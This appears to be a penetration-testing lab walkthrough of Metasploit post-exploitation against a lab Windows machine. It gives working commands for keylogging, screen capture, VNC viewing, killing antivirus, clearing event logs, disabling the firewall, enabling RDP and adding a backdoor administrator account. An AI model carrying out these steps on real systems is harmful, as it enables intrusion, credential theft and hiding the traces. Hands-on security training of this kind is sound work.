Now that we have the shell, we will look into ways in which we will try to exploit the system. When we have a meterpreter session, we can use $`bg` to come in and out of the meterpreter sessions. Sometimes we can have multiple sessions open so to go back and forth we do $`sessions 2` in order to get the session where we want to go. $`sessions` is used to see what sessions we have opened and this is done outside of the session itself in msfconsole. $`msf6 exploit(multi/handler) > sessions`. This will display all the sessions that we have opened. In order to take a screenshot in the victim computer, we hit $`screenshot` once we do that it will give us a display of the screenshot of the victim machine. It will save it in the home/kali folder. 
There are many things that we can do in the meterpreter session in order to utilitze the shell that we have. To see the full list of all the functions we can use. We type in $`help`. We can start a keylogger in order to see what passwords we can use. In order to do so we type in $`keyscan_start`. This will start logging all the keystrokes the victim is typing on. In order to see what they typed we will do a $`keyscan_dump` We can see what they typed and in order to stop it, we do $`keyscan_stop`. 
If you want to see the live view of the victim's machine, then you need to use the command $`vnc` which stands for virtual network computing. We type in $`run vnc -i` $`ps` is another useful command which shows all the running processes in the victim machine. This can be useful for shutting off antivirus machines on the victim's machine. 
In order to cover your tracks as a penetration tester. If we need to clear the logs from the victim machines of the activities we have performed in the machine, we type in $`clearev`. This will clear all the event logs in the victim machine. 
Now that we already have a shell in the victim machine, we can use the postmodules to do nefarious things in the machine. For example if we want to kill the antivirus in the victim machine, we type in $`search type:post kill av` Below is an example. 

![postmodules](https://user-images.githubusercontent.com/93686063/202770755-850a6475-c660-43dd-8766-04e592b79069.JPG)

We can only use the post modules if we have a shell already in the victim's machine. As with using any exploit, we do $`options` to see the parameters that we need to set in order to use it. Since we are Session 4 we will just type in $`set session 4`. After that we just hit $`run`. The result we got for this exploit was $`No Target processes were found`, which means no AV was found. If there were any it would have found 1. 

Now we can try to RDP into the machine which has to be done outside the msfconsole, for that we type in $`rdesktop -u(user) vagrant -p(vagrant) 10.0.2.8:3389(port for rdp not 5555)`. We will not be able to get in because rdp is disabled in the machine. In order to use rdp on the machine, we will have to turn rdp on in the machine. For that we need to go back to our shell. We go to our shell and hit $`back` to get out from our post for av and find one for enable rdp. We type in $`search type:post windows enable_rdp` We hit $`use 0` and do options to see the variable you have to set. Once we hit $`run` we can see that rdp was enabled. 

In order to stay persistent in the victim's machine, we need to use a backdoor, we need to create our own user and hope they dont find out. If we type $`shell` on meterpreter, we will be using the meterpreter as a windows machine and not linux. We need to disable firewall first so that we do not get blocked. In order to do that we type in shell $`C:\Users\vagrant\Desktop>netsh advfirewall set currentprofile state off` We turn the firewall off so that they do not kick us out of the program. Now we will add a user. Type in $`net user guest toor12345/add` Now in order to do anything we need to add our user to admin group so we can get things done. Type in $`net localgroup administrators guest /add` if you get all of that right. You will get the following screen. 

![rdp guest](https://user-images.githubusercontent.com/93686063/202776599-29404b63-dc1a-4765-ac99-77f721586e01.JPG)

Now we have what we need, we have been able to exfiltrate the data we needed, now we need to get out without a trace. First we will delete the user that we added as admin so the victim has no idea we were there. $`net user npower /delete` This will delete the user. 
